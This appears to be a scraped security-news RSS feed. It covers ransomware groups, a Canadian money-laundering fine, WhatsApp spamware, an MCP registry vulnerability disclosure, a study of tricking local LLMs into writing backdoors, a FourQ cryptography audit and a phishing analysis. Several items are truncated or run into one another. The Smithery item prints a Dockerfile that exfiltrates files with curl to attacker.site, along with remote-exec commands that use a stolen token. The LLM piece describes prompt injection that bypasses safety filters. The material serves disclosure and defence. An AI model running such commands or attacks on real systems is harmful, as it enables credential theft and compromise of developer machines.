region, target type, and those who provide larger victims will yield a more successful investment,” stated the threat actor. The Nova RaaS team was going to onboard investors via Session Messenger, where they could receive a trust badge. The description of the program also indicated that “this badge will grant you access to Nova's private chat server for enhanced privacy and a higher percentage of the ransom value, make sure that we will give you full access to Chat negotiation, and you will be able to see chat with victims.”On July 29, 2025, the ransomware operators stopped the Nova Investment Affiliate Program. They stated that instead, they would introduce another program that would be helpful for other members who cannot make deposits. The new program should allow new members to use Nova Ransomware Group’s resources and services for free if they provide one high-revenue access based in the US or the EU.In July 2025, Insikt Group observed the activities of D4rk 4rmy Blog, a dark web “name-and-shame” extortion blog likely operated by D4rk 4rmy (also known as “D4rk4rmy”) Ransomware Group. The extortion website contains the Chinese phrase “共产主义勒索软件党,” which is translated into English as “Communist Ransomware Party.” The threat group offers a hacker-for-hire service. It stated that it is an established group and is looking for experienced partners to cooperate. It only accepts Chinese, Russian, and English-speaking threat actors “who must be fluent in these languages” (likely in one of these three languages).Dragon Force: Cartel and Premium RaaSOn April 24, 2025, “dragonforce”, a member of Ramp Forum and representative of Dragon Force Ransomware Group, stated that they would release RansomBay, a project that will target “Tier 1” countries with revenue up to $150 million. In addition, on September 15, 2025, Dragon Force Ransomware Group announced a coalition with Qilin and LockBit (LockBit 5.0 RaaS released on September 3, 2025, with an updated functionality). As of writing, Insikt Group cannot evaluate whether the threat groups completely combined teams, efforts, and resources or whether the statement was made to intimidate or mislead other rivalries of Dragon Force.(Source: Recorded Future Data)Appendix C: List of Targeted Entities Under Operation EndgameSmokeloader (“Greenhorse”)Identification of customersRussian arrests and seizures]]></content:encoded></item><item><title>Iranian hackers targeted over 100 govt orgs with Phoenix backdoor</title><link>https://www.bleepingcomputer.com/news/security/iranian-hackers-targeted-over-100-govt-orgs-with-phoenix-backdoor/</link><author>Bill Toulas</author><category>security</category><pubDate>Wed, 22 Oct 2025 21:19:33 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[State-sponsored Iranian hacker group MuddyWater has targeted more than 100 government entities in attacks that deployed version 4 of the Phoenix backdoor.

The penalties for violating Canada’s anti money-laundering laws come ten months after KrebsOnSecurity noted that Cryptomus’s Vancouver street address was home to dozens of foreign currency dealers, money transfer businesses, and cryptocurrency exchanges — none of which were physically located there.On October 16, the Financial Transactions and Reports Analysis Center of Canada (FINTRAC) imposed a $176,960,190 penalty on , more commonly known as the cryptocurrency payments platform .FINTRAC found that Cryptomus failed to submit suspicious transaction reports in cases where there were reasonable grounds to suspect that they were related to the laundering of proceeds connected to trafficking in child sexual abuse material, fraud, ransomware payments and sanctions evasion.“Given that numerous violations in this case were connected to trafficking in child sexual abuse material, fraud, ransomware payments and sanctions evasion, FINTRAC was compelled to take this unprecedented enforcement action,” said , director and CEO at the regulatory agency.In December 2024, KrebsOnSecurity covered research by blockchain analyst and investigator , who’d spent several months signing up for various cybercrime services, and then tracking where their customer funds go from there. The 122 services targeted in Sanders’s research all used Cryptomus, and included some of the more prominent businesses advertising on the cybercrime forums, such as:-abuse-friendly or “bulletproof” hosting providers like anonvm[.]wtf, and PQHosting;
-sites selling aged email, financial, or social media accounts, such as verif[.]work and kopeechka[.]store;
-anonymity or “proxy” providers like crazyrdp[.]com and rdp[.]monster;
-anonymous SMS services, including anonsim[.]net and smsboss[.]pro.Flymoney, one of dozens of cryptocurrency exchanges apparently nested at Cryptomus. The image from this website has been machine translated from Russian.Sanders found at least 56 cryptocurrency exchanges were using Cryptomus to process transactions, including financial entities with names like casher[.]su, grumbot[.]com, flymoney[.]biz, obama[.]ru and swop[.]is.“These platforms were built for Russian speakers, and they each advertised the ability to anonymously swap one form of cryptocurrency for another,” the December 2024 story noted. “They also allowed the exchange of cryptocurrency for cash in accounts at some of Russia’s largest banks — nearly all of which are currently sanctioned by the United States and other western nations.”Reached for comment on FINTRAC’s action, Sanders told KrebsOnSecurity he was surprised it took them so long.“I have no idea why they don’t just sanction them or prosecute them,” Sanders said. “I’m not let down with the fine amount but it’s also just going to be the cost of doing business to them.”The $173 million fine is a significant sum for FINTRAC, which imposed 23 such penalties last year totaling less than $26 million. But Sanders says FINTRAC still has much work to do in pursuing other shadowy money service businesses (MSBs) that are registered in Canada but are likely money laundering fronts for entities based in Russia and Iran.In an investigation published in July 2024, and the Investigative Journalism Foundation (IJF)documented dozens of cases across Canada where multiple MSBs are incorporated at the same address, often without the knowledge or consent of the location’s actual occupant.Their inquiry found that the street address for Cryptomus parent Xeltox Enterprises was listed as the home of at least 76 foreign currency dealers, eight MSBs, and six cryptocurrency exchanges. At that address is a three-story building that used to be a bank and now houses a massage therapy clinic and a co-working space. But the news outlets found none of the MSBs or currency dealers were paying for services at that co-working space.The reporters also found another collection of 97 MSBs clustered at an address for a commercial office suite in Ontario, even though there was no evidence any of these companies had ever arranged for any business services at that address.]]></content:encoded></item><item><title>TARmageddon flaw in abandoned Rust library enables RCE attacks</title><link>https://www.bleepingcomputer.com/news/security/tarmageddon-flaw-in-abandoned-rust-library-enables-rce-attacks/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Wed, 22 Oct 2025 17:21:24 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[A high-severity vulnerability in the now-abandoned async-tar Rust library and its forks can be exploited to gain remote code execution on systems running unpatched software.

These add-ons hijack WhatsApp Web—the browser version of WhatsApp—to automate bulk messages and skirt anti-spam controls.Spamware is software that automates the sending of unsolicited bulk messages—often for advertising, phishing, or even spreading malware—across email, messaging apps, or social media.According to Socket, the extensions inject code directly into the WhatsApp Web site, running alongside its own scripts to automate bulk outreach and scheduling. This helps them bypass WhatsApp’s anti-spam controls.The 131 extensions all share the same codebase, design patterns, and infrastructure. This is obviously a sign that something is off. If you’re proud of your product, why would you disguise it under dozens of aliases?Some marketers use WhatsApp spamware to automate and scale up outbound campaigns, flooding users with unwanted promotional messages or links. The extensions promise to help them evade WhatsApp’s built-in limits, enabling large-volume outreach that would typically be blocked if attempted manually. These tools offer them a readily available spam infrastructure.But having a spamware extension installed isn’t just a problem for others—it can also pose a direct risk to yourself:These extensions inject code into web sessions, potentially exposing your messages and login data to third parties.Many of these extensions automate actions that can get your WhatsApp or Google account restricted or banned.Many promotional sites for these extensions claim that Chrome Web Store inclusion means a rigorous audit and code review that guarantees privacy and safety. In reality, Chrome’s process is a policy compliance review, not a certification, and presenting it as an audit misleads buyers and creates a false sense of security.That said, it’s still safer to download from the official Chrome Web Store than from random sites or direct file links. The store has reporting, review and takedown processes that most other sources lack.The researchers reported the extensions to the Chrome security team and requested that the associated publisher accounts be suspended for policy-violating spamware.Check extension permissions.Avoid add-ons that “automate” messaging apps.Stick to reputable developers.If in doubt, remove suspicious extensions and scan your browser and device for threats.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>Meta launches new anti-scam tools for WhatsApp and Messenger</title><link>https://www.bleepingcomputer.com/news/security/meta-launches-new-anti-scam-tools-for-whatsapp-and-messenger/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Wed, 22 Oct 2025 15:11:54 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Meta has announced new tools to help WhatsApp and Messenger users protect themselves from potential scams and secure their accounts.

Here's what happened and why it matters:A simple configuration bug allowed attackers to access sensitive files on the registry’s infrastructure, leading to the theft of overprivileged administrative credentials.These stolen credentials provided access to over 3,000 hosted AI servers, enabling the theft of API keys and secrets from potentially thousands of customers across hundreds of services.The vulnerability was quickly patched after responsible disclosure, and no evidence of exploitation was found. Centralized AI infrastructure creates high-value targets where a single vulnerability can compromise entire ecosystems.MCP Hosting and Threat ModelingThe Model Context Protocol (MCP) enables AI applications to connect with external tools and data sources through server implementations. Those servers generally fall into two main categories: Where the servers provide access to local resources, such as the local filesystem of the command line. When the servers provide access to remote resources such as databases or API providers.Remote servers can also be split into two categories depending on where and how they are hosted: Where the remote server is hosted on the user’s own infrastructure or even on their own local machine. Where the resource providers directly host the servers. It is, for example, the case with the Sentry MCP server that is hosted at .Each of those hosting models has its own specificities and, from a security perspective, its own threat model and set of MCP best practices.Among those models, Smithery.ai, an early-day MCP server registry, implements a hybrid approach: the registry itself will host remote servers that would have otherwise been self-hosted. This approach makes it easier than ever to deploy and use an MCP server. However, it also presents unique challenges on the threat modeling side, as the magnitude of a security incident on the hoster’s side can significantly increase due to the number of hosted servers and the vast range of features and resources it provides access to.While studying Smithery’s hosted servers for a previous research project, we uncovered a critical security issue in the registry’s software that illustrates this increased risk.Smithery relies heavily on GitHub to manage the source code for its hosted servers. To submit a server to the registry, users create a GitHub repository containing the server’s code and the required registry-specific configuration files.The registry then builds the servers into Docker images that it then uses to host the server and expose it to clients. This leaves the MCP servers' contributors with control over the Docker build configuration that is executed on the registry side, opening an important attack surface.Server build configurationWhen building a server in the  hosting model, Smithery expects the server repository to contain a  configuration file. A legitimate configuration file contains a few properties:runtime: "container"
build:
  dockerfile: "Dockerfile"           # Path to your Dockerfile
  dockerBuildPath: "."               # Docker build context
startCommand:
  type: "http"
  configSchema:                      # JSON Schema for configuration
    type: "object"
    properties:
      apiKey:
        type: "string"
        description: "Your API key"
    required: ["apiKey"]
  exampleConfig:
    apiKey: "sk-example123"The most interesting part of this configuration is the build section that contains the information required by Smithery to build the server. There are only two required properties in this section:: The path to the Docker build context inside the repository.: The path to the Dockerfile to use inside the build context.Later in the build process, Smithery will copy the context directory to the Docker daemon, along with the . The daemon will then build the image, which will then be run to provide the server's features to the clients.The  content is server-specific and does not need to contain any Smithery-related instructions.The main problem with the build process is that the  configuration value is improperly controlled. The build process accepts any value, including those that point to a location outside of the MCP server code repository.In practice, it is possible to provide an arbitrary location on the builder machine's file system that will be used as the Docker build context. This means that the complete content of the referenced location will be sent to the Docker daemon at build time, making it accessible to instructions inside the attacker-controlled Dockerfile. In theory, this could allow reading the content of any file on the builder machine's file system and exfiltrating it to the attacker, with sensitive content disclosure threats.However, for the attack to work, there are a few limitations to circumvent:The copy of the chosen context to the Docker daemon must work. This means that the user running the Docker build must have read access to all the files in the location. Including special files or devices (like /dev/urandom) can also pose problems for the same reason.The attacker-controlled Dockerfile must be located in the context location, and its path must be known in advance.When combined, those restrictions force the build context directory to be a parent folder of the cloned server repository, in which the build user has full read permissions. Using the filesystem’s root as the build context was not an option.We found that using  as the build context was a good option to exploit the issue in our case. Indeed, this directory, which proved to be the user’s home directory, contains files that should normally not be exposed to the server’s build process. It also made it simple to locate the attacker-controlled Dockerfile, in our case , where  was the name we used for the GitHub repository containing our server implementation.The malicious  file we used was the following:runtime: "container"
build:
  dockerfile: "test/Dockerfile"           # Path to your Dockerfile
  dockerBuildPath: ".."               # Docker build context
startCommand:
  type: "http"
  configSchema:                      # JSON Schema for configuration
    type: "object"
    properties:
      apiKey:
        type: "string"
        description: "Your API key"
    required: ["apiKey"]
  exampleConfig:
    apiKey: "sk-example123"We combined this malicious configuration with the following malicious  that exfiltrated the list of available files to an internet endpoint:FROM alpine
RUN apk add curl
RUN mkdir /data
COPY . /data # Copy the content of the context directory to the container
RUN curl -si https://attacker.site/?d=$(find /data | base64 -w 0) # Exfiltrate the filesystem tree to internet
Triggering a build revealed the content of the build user's home directory on Smithery’s server build instance./data

[TRUNCATED]This first exfiltration revealed the presence of potentially sensitive files in the scope of the attack. In particular, an attacker could access the  that can contain authentication secrets.A second exfiltration allowed the recovery of this file’s content.{
    "auths": {
        "registry.fly.io": {
            "auth": "eDpmbTJfbE[REDACTED]E01OUJXWFA="
        }
    }
}The Docker configuration contained a fly.io authentication token.Escalating with overprivileged secretsAccording to their official website, fly.io is "the most flexible and powerful compute platform on any public cloud," providing hardware-virtualized containers called Fly Machines. It offers a set of features to control those machines with the so-called  along with convenience features for users. One of those is a Docker container registry for which the authentication token was disclosed as a result of the previous attack.The issue with fly authentication tokens is that there is a single type of credential for both the  API and the Docker registry. The segregation between the two only depends on the privileges associated with the secret’s related identity. This leaves room for errors and overprivileged identities.In practice, we observed that the API token defined in the  file suffered from this overprivilege issue. Instead of only providing access to the fly.io Docker repository, it also granted privileges on the  API:$ curl -H "Authorization: Bearer fm2_lJPE[REDACTED]FSNparLM59BWXP" --url 'https://api.machines.dev/v1/apps?org_slug=smithery'

      "machine_count": 2,
      "network": "default"
    },
[...]
The compromised secret allowed access to a fly.io organization that contained more than 3000 apps. Most of those apps correspond to a hosted MCP server. Some others are used to host parts of Smithery’s service infrastructure.Fly.io’s machine API also allows, with the appropriate privileges, to execute code in arbitrary machines in the available apps. The authentication token we previously disclosed had such privileges:curl -s --request POST -H "Authorization: Bearer fm2_lJPE[REDACTED]FSNparLM59BWXP" --url 'https://api.machines.dev/v1/apps/smithery-6a[REDACTED]25/machines/e[REDACTED]8/exec' --data '{"cmd": "","command": ["id"],"container": "","stdin": "","timeout": 5}'
{
  "stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
  "stderr": "",
  "exit_code": 0,
  "exit_signal": 0
}All in all, the compromised fly.io API credentials allowed attackers to execute arbitrary code on any of the MCP servers hosted by Smithery, along with part of the provider’s own infrastructure.The supply-chain risk for Smithery usersWith the compromise of Smithery’s hosted MCP servers comes an important question: what are the direct consequences for the service customers? The answer depends on how MCP servers are used, which services they access, and on the attacker’s objective.Indeed, once code execution is possible on an MCP server, this server should be considered compromised and untrusted. Considering the servers are meant to return data to the MCP client that will later be processed by an LLM, a first possible threat is prompt injection attacks. The compromised server could be used to inject malicious prompts into the MCP client and associated LLM to achieve a variety of purposes that depend on the environment of execution and could potentially range from local command execution to sensitive information disclosure. This risk has already been highlighted in past publications, exploiting the cross-server implicit trust relationship.Another threat is the direct consequence of remote MCP servers’ requirements in terms of identities and secrets. Indeed, all the servers Smithery hosts are remote servers. They are meant to access remote resources like data sources and APIs. As such, they need to handle the secrets required to access such resources. Therefore, by controlling the MCP servers, attackers can directly interact with those secrets.We illustrated this risk during our research by dumping the inbound network traffic from a server hosted on Smithery.$ curl -s -X POST -H "Authorization: Bearer fm2_lJPE[REDACTED]FSNparLM59BWXP" \
  'https://api.machines.dev/v1/apps/smithery-[REDACTED]/machines/[REDACTED]/exec' \

The network capture result shows client requests sent to the targeted server.The query parameters in the captured HTTP request contain the client-sent credentials:{"braveApiKey":"BSA_[REDACTED]ei"}The same attack method could have been applied to the more than 3000 available servers hosted on the platform. That way, the secrets of thousands of clients to hundreds of sensitive services could have been compromised.Reflections on MCP, supply chain, and secretsThe attack we demonstrated on Smithery’s registry could have had severe consequences if exploited by malicious threat actors. Remote MCP servers are a gateway to some of the most sensitive services used by developers and companies all over the world. A concentration of servers, such as those on Smithery's platform, creates a valuable target for threat actors. Therefore, this centralization comes with additional risks.Earlier this year, we observed the same kind of concentration exploited by active threat actors during the Salesloft supply chain attack, where the attackers took advantage of how Salesloft stored the OAuth secrets to its customers' assets. This attack strategy has significant advantages for attackers that can, in a single attack, affect hundreds of companies by abusing existing trust relationships. We will likely observe more and more attacks of this kind where companies' secrets are the main target, allowing for an easy and efficient lateral movement vector. This evolution of the threat landscape should be considered as part of the risk analysis when choosing an MCP hosting model.The way MCP servers manage secrets is another factor that tends to amplify the impact of credential extraction from them. Contrary to the MCP best practices detailed in the official documentation of the protocol, the majority of the servers do not rely on OAuth for the authentication against the remote datasource. In most cases, as demonstrated in our attack, the authentication is performed using static, long-term credentials such as classical API keys. Doing so limits the ability to refine the privileges granted to the servers and increases the attacker's exploitation timeframe. While OAuth isn't a silver bullet defense against supply chain compromise, as the Salesloft attack showed, it can still help reduce the impact of such incidents when configured correctly.Acknowledgment and timelineWe want to acknowledge the Smithery team's answer to our vulnerability disclosure.

Our research on  (for OpenAI’s Red‑Teaming Challenge) shows they are much more prone to being tricked than frontier models. When attackers prompt them to include vulnerabilities, local models comply with up to 95% success rate. These local models are smaller and less capable of recognizing when someone is trying to trick them.Prompt and code injectionsLLMs are facing a lethal trifecta: access to your private data, exposure to untrusted content and ability to externally communicate. They’re facing new threats such as code injection, when an attacker as part of a prompt can introduce vulnerabilities in your application.Unfortunately, smaller models such as  are quite vulnerable.The malicious code looks legitimate, passes basic review, and can persist in production systems or immediately compromise developer machines.We present two ways attackers can exploit local LLMs to generate malicious code. The first plants hidden backdoors that look like normal features. The second forces immediate code execution during your AI-assisted coding session.Both attacks work by manipulating prompts. Your AI assistant generates dangerous code while thinking it’s being helpful. Here’s how they work.Attack #1: The “easter egg” backdoor (95% success)The first type of attack tricks the model into planting an RCE backdoor by disguising it as a harmless “easter egg”. The prompt seems innocent: it asks for a feature and a hidden surprise. Because local models like  are unable to recognize malicious intent, they readily comply.The attack uses a prompt like this:The model generates the requested web server, but also inserts this malicious code: 95% (best prompt, sample of 100), 86% (other variants of the prompt, sample of 800) In limited spot checks, GPT-5 appears resistant to this specific prompt.This creates a severe vulnerability. The backdoor persists through deployment. An attacker can now execute arbitrary code on the production server through a simple HTTP header, allowing them to steal credentials, private keys, or session data.The async ping – included in the prompt – creates a “sleeper cell” that checks for the  environment variable, notifying the attacker only when the backdoor is active in a production environment.The high success rate shows how consistently local LLMs can be manipulated into generating backdoors when they mistake malicious code for innocent “easter eggs” that they are asked to hide.This second attack is faster and more direct. While the first attack plants a backdoor for later use, this one doesn’t wait for code to be deployed. It achieves immediate RCE on the developer’s machine during the code generation process.The technique works by first distracting the model with a cognitive overload to bypass its safety filters. Once the model’s defenses are down, a second part of the prompt asks it to write a Python script containing an obfuscated payload.The model, focused on the puzzle, complies and writes code that executes the payload. The obfuscated Python code:This deobfuscates to the string , and the final malicious code is: In limited spot checks, GPT-5 is also vulnerable to this technique, though at a lower success rate.While the 43.5% success rate may seem lower than the first attack, it’s a crucial threat: it is more direct and dangerous. It provides immediate RCE on a developer’s machine – no deployment needed – and only has to succeed once.A single compromise – during an LLM-assisted session – gives an attacker full access, allowing them to steal local credentials (like  or  keys), install malware, or move deeper across the network.These attacks don’t require sophisticated exploits; they succeed by turning a developer’s normal workflow into an attack chain. It starts when a developer injects seemingly harmless content into their AI assistant’s context window.Attacker plants malicious prompt in likely-to-be-consumed content.Developer feeds this content to their AI assistant – directly or via MCP (Model Context Protocol).AI generates compromised code during normal workflow.Developer deploys code or runs it locally.Attacker gains persistent access or immediate control.The first step – planting the malicious prompt – is the most critical. Common vectors for this may include: Malicious prompts hidden in code examples within  files, API docs, or Reddit discussions. Context-providing servers (like Context7 can be manipulated to feed malicious examples from public documentation into a developer’s environment. A seemingly helpful suggestion in a GitHub issue or pull request comment that contains a hidden code example.Why local models make this worseThe conventional wisdom that local, on-premise models offer a security advantage is flawed. While they provide data privacy, our research shows their weaker reasoning and alignment capabilities make them easier targets for sabotage.This creates a security paradox. With cloud-based frontier models, prompts are often monitored for malicious intent, and attempting these attacks may violate provider terms of service. You can’t safely red-team the models with the best defenses. As experiment from Tom Burkert shows, some models like Claude Sonnet 4.5 and Grok 4 will even refuse to process prompts with obfuscated text, returning a “Safety Fail” response instead.This lack of oversight creates a testing blind spot. Researchers can’t test frontier models, while local models remain open to red-team testing. This makes the supposedly “safer” option more vulnerable due to: Less capable of identifying malicious intent in complex prompts More susceptible to cognitive overload and obfuscation techniques Fewer resources dedicated to adversarial prompt detectionOur testing confirmed that while frontier models like GPT-5 are harder to exploit – requiring more sophisticated attacks for lower success rates – their security capabilities are difficult to actually assess.The path forward: a new class of defensesThe discovery of these direct code injection attacks reveals a critical blind spot: the software community lacks a safe, standard way to test AI assistant security. Unlike traditional software where penetration testing is routine, our only “safe” labs are the most vulnerable local models.This new threat requires a new mindset. We must treat all AI-generated code with the same skepticism as any untrusted dependency and implement proper strategies in this new wave of LLM-assisted software development. Here are four critical defenses to start with:All generated code must be statically analysed for dangerous patterns (e.g., , ) before execution, with certain language features potentially disabled by default.Initial execution of code should be in a sandbox (e.g., a container or WebAssembly runtime).The assistant’s inputs, outputs, and any resulting network traffic must be monitored for anomalous or malicious activity.A simple, stateless “second look” could prevent many failures. A secondary review by a much smaller, simpler model, tasked only with checking the final output for policy violations, could be a highly effective safety layer. For example, a small model could easily flag the presence of  in the generated code, even if the primary model was tricked into generating it.Ultimately, LLMs – including local ones – are powerful tools, but they are not inherently secure. Adopting these defensive measures is the first step toward securing this new, emerging software supply chain.]]></content:encoded></item><item><title>Bombay High Court Orders Department of Telecommunications to Block Medusa Accounts After Generali Insurance Data Breach</title><link>https://databreaches.net/2025/10/22/bombay-high-court-orders-department-of-telecommunications-to-block-medusa-accounts-after-generali-insurance-data-breach/?pk_campaign=feed&amp;pk_kwd=bombay-high-court-orders-department-of-telecommunications-to-block-medusa-accounts-after-generali-insurance-data-breach</link><author>Dissent</author><category>databreach</category><pubDate>Wed, 22 Oct 2025 12:46:41 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Cryptographic Issues in Cloudflare&apos;s Circl FourQ Implementation (CVE-2025-8556)</title><link>https://www.botanica.software/blog/cryptographic-issues-in-cloudflares-circl-fourq-implementation</link><author>/u/sh0oki</author><category>netsec</category><pubDate>Wed, 22 Oct 2025 12:46:19 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[
    In early 2025, while working on a project which required us to perform a broad audit of OSS elliptic curve implementations – we discovered several cryptographic issues in Cloudflare's CIRCL library – specifically with the implementation of the FourQ elliptic curve.
  
    We reported the issues through Cloudflare's HackerOne bug bounty plan in March 2025, and subsequently contacted Cloudflare directly, after having received a lukewarm and laconic response from the HackerOne triage team.
  
    Once the team at Cloudflare stepped in the issues were appropriately acknowledged and fixed.
  FourQ, Cloudflare's CIRCLCIRCL, which is Cloudflare's cryptography library, offers a basic implementation of the FourQ curve, as well as a Diffie-Hellman implementation named  which offers shared secret functionality.
  
    FourQ is an elliptic curve with 128-bit security, developed by Microsoft Research and is defined by a twisted Edwards curve equation.
  
    The curve is defined over a two-dimensional extension of the prime field defined by the Mersenne prime \(p = 2^{127} - 1\), the curve twist parameter \(a = -1\) and \(d\) set to a quadratic nonresidue in \(F_{p^2}\).
  
    Simply put, much like the complex numbers are an extension field of the real numbers – the FourQ curve is defined over an extension of a prime field, its elements being of the form \(a + bi\) where \(a\) and \(b\) are in the integers\(\mod p\).
  
    In addition, the FourQ curve defines two endomorphisms, or structure-preserving functions, which serve as "shortcuts" to perform computations on the curve more efficiently.
  
    These endomorphisms, along with the other characteristics of the FourQ curve, make it fast and suitable for use-cases where computational resources are scarce – such as in embedded systems.
  
    A certain class of attacks on elliptic curve implementations allows an attacker to force the server to perform a calculation which discloses information about the secret key used.
  
    This type of attack is often called an invalid curve or invalid point attack, and stems from insufficient validation of the points used to perform the calculation.
  
    Elliptic Curve Diffie-Hellman or ECDH involves each side taking a secret scalar \(k\) and multiplying it with a fixed generator point \(G\) to compute the point \(Q = k*G\). Each side transmits its \(Q\) point, and receives the other side's \(Q\) point, multiplying it by his own \(k\) scalar. Since scalar multiplication in elliptic curves is commutative – both sides will end up with the same point.
  // Shared calculates a shared key k from Alice's secret and Bob's public key.
// Returns true on success.
func Shared(shared, secret, public *Key) bool {
    var P, Q fourq.Point
    ok := P.Unmarshal((*[Size]byte)(public))
    Q.ScalarMult((*[Size]byte)(secret), &P)
    Q.Marshal((*[Size]byte)(shared))
    ok = ok && Q.IsOnCurve()
    return ok
}

    An example from CIRCL's  implementation (pre-remediation), shows a shared secret being calculated, by taking as input a public point () and a secret scalar, and multiplying them.
  
    The issue arises when the computation is done without first verifying that the other side's point is a valid point on the curve. The reason is that in order to be secure – all points on an elliptic curve must be members of an \(N\)-torsion subgroup, where \(N\) is the order of the curve – the total amount of points on the curve.
    Put more clearly – if we consider a point being added to itself a "step", then every point on the curve should have the same amount of "steps" required to lead back to the identity point, or the "starting" point.
  
    Meaning if one multiplies a certain point \(Q\) by the secret scalar \(k\), if the point is valid and on the expected curve, the result should land in any of the \(N\) points on the curve. For the curve to be considered secure, it must have an order \(N\) which is either a prime number, or composed from a large prime number and a small cofactor.
  
    This is what makes the discrete logarithm problem difficult with regards to scalar multiplication, thus creating a "trap-door" function where it is easy to perform the multiplication, but hard to reverse it.
  
    If an attacker is able to force the server to perform the scalar multiplication of his secret \(k\) with an invalid point \(\widehat{Q}\) which is not on the curve – he may choose \(\widehat{Q}\) such that it belongs to a curve with a smooth (composed of many small factors) subgroup order \(\widehat{N}\).
  
    As a result – instead of \(k*Q\) computing any possible point on the original curve, it will instead land in any of a smaller set of points.
    For instance, the subgroup order of \(\widehat{Q}\) is only 400 points, the attacker will be able to trivially brute-force 400 values of \(k\) to find the server's secret \(k\) value, modulo 400.
  
    If repeated for multiple invalid points, with different subgroup orders, and in combination with the Chinese Remainder Theorem, the attacker will eventually be able to extract the server's secret \(k\) value.
  Degenerate curve attacks on Edwards curves
    The above attack is applicable on a form of elliptic curves called Weierstrass curves. While Edwards curves are birationally equivalent to Weierstrass curves, meaning a curve such as FourQ may be represented using Weierstrass formulas – the invalid curve attack as presented in the previous section does not generalize to Edwards curve.
   (x₁ != x₂):
  \[
  \lambda = \frac{y_2 - y_1}{x_2 - x_1}
  \]
  
  \[
  x_3 = \lambda^2 - x_1 - x_2
  \]
  
  \[
  y_3 = \lambda (x_1 - x_3) - y_1
  \]
  
  \[
  x_3 = \frac{x_1 y_2 + y_1 x_2}{1 + d x_1 x_2 y_1 y_2}
  \]
  
  \[
  y_3 = \frac{y_1 y_2 - a x_1 x_2}{1 - d x_1 x_2 y_1 y_2}
  \]
  
    The reason for this is that while addition using the Weierstrass formulas is independent of the curve parameters, Edwards addition formulas are dependent on both curve parameters \(a\) and \(d\), which makes it impossible (or more accurately very difficult) to pass arbitrary points, i.e. points which are not on the curve and have the server perform addition on them correctly.
  
    If we take a closer look at the Edwards addition formula, we see that the curve parameters (\(a\) and \(d\)) are coefficients of the \(x\) variable – meaning if we affix \(x\) to 0, the curve parameters cancel out and we are left with a less generalized invalid point attack which does work on all Edwards curves.
  
    Concretely – if we pass in a point of form \((0, y)\), the result of multiplying it by the secret value \(k\) computes \((0, y^k)\). As such, if we select an appropriate \(y\) value such that the point \((0, y)\) has a small multiplicative subgroup order, and receive the value \((0, y^k)\) – solving the discrete logarithm problem to recover \(k\) becomes trivial.
  
    In consideration of the invalid curve attacks presented above, the main adversarial threat to ECC implementation lies with performing computations on invalid points – points which are not on the graph.
    As such – points should always be validated before being relied upon for any computation.
  
    At minimum, the process of unmarshalling a point, meaning loading an appropriate length byte-array and converting it to a point on the curve – should ensure that the point loaded is indeed a valid point on the curve – simply by checking if the curve equation holds.
  
    For added security – the point should also be validated before being used in any of the basic computations – addition, doubling/scalar multiplication.
  
    While auditing CIRCL's FourQ implementation we pinpointed 7 total issues related to these security primitives, as well as to the testing code – which incorrectly demonstrated some security proofs.
  
    Below is a short description of the 4 major points we raised, and were to some extent addressed by the fixes to CIRCL.
  Incorrect point validation in 
    The issue here is a missing step – the IETF spec for FourQ accounts for some ambiguity in the unmarshalling process by conjugating the point's \(x\) value – if not the unmarshalled point nor its conjugate are valid points on the curve – the unmarshalled point is invalid.
  
    The IETF spec contains the following pseudocode:
  if -x^2+y^2 != 1+d*x^2*y^2:  # Check curve equation with x
     x = conj(x)
if -x^2+y^2 != 1+d*x^2*y^2:  # ... or its conjugate
     return FAILED
return P = (x,y)
  
    The CIRCL implementation fails to re-validate the point being on the curve after conjugating its \(x\) value:
  if !P.IsOnCurve() {
    fpNeg(&P.X[1], &P.X[1])
}
return true
  Faulty point comparison in 
    The CIRCL code, as per the IETF spec, uses several representations of projected coordinates – this means that in addition to the \(x\) and \(y\) value, each point also has an additional \(Z\), \(Ta\) and \(Tb\) values, where \(Z * Ta * Tb \equiv x * y\).
  
    The issue here is that if \(Z\) is set to 0 – which is invalid in the context of the projected representation – the  check always returns true.
  
    Several checks in the code were affected by the issue, including faulty tests.
  Lack of point validation in 
    Since the FourQ curve has a cofactor of 392 – meanings its order is not a prime number but rather a prime number multiplied by 392 – in order to ensure that the point being used for computation is an \(N\)-torsion point, the cofactor must be cleared by multiplying the point by 392 prior to any additional scalar multiplications.
    If we end up with the neutral point as a result of clearing the cofactor – the input point is invalid.
  
    The CIRCL implementation deviates from the spec by failing to perform this verification after clearing the cofactor.
  Lack of point validation in 
    The scalar multiplication implementation on  assumes that the projected values are valid, and that the point is indeed on the curve.
    As a result of the previous issue with unmarshalling, it's as possible to load a point which isn't on the curve, and then perform computations on it, which exposes the implementation to the degenerate curve attacks described above.
  
    Fixing the unmarshalling issue prevents this issue, as does the change to the code in  which performs the DH computation.
    However, in order to conform with more stringent security measures, it would be advisable to validate that the input point is on the curve prior to performing the scalar multiplication.

It claimed we’d won a Gorilla Carts dump cart (that’s a sort of four-wheeled wheelbarrow for anyone unfamiliar)—and said it was just one click away.The whole image in the email was clickable, and it hid plenty of surprises underneath.The sender email’s domain () is related neither to Home Depot nor the recipient.The  domain belongs to a Los Angeles high school. The email address or server may be compromised. We have notified them of the incident.Below the main image, we found a block filled with unnecessary Unicode whitespace and control characters (like , ), likely trying to obfuscate its actual content and evade spam filters. The use of zero-width and control Unicode characters is designed to break up strings to confound automated phishing or spam filters, while being invisible to human readers.Reusing legitimate content:Below the image we found an order confirmation that appears to be a legitimate transactional message for trading-card storage boxes.The message seems to be lifted from a chain (there’s a reply asking “When is the expected date of arrival?”), and includes an embedded, very old order confirmation (from 2017) from —a real vendor for card supplies.So, the phisher is reusing benign, historic content (likely harvested from somewhere) to lend legitimacy to the email and to help it sneak past email filters. Many spam and phishing filters (both gateway and client-side) give higher trust scores to emails that look like they’re part of an existing, valid conversation thread or an ongoing business relationship. This is because genuine reply chains are rarely spam or phishing.We also found a one-pixel image in the mail—likely used to track which emails would be opened. They are almost invisible to the human eye and serve no purpose except to confirm the email was opened and viewed, 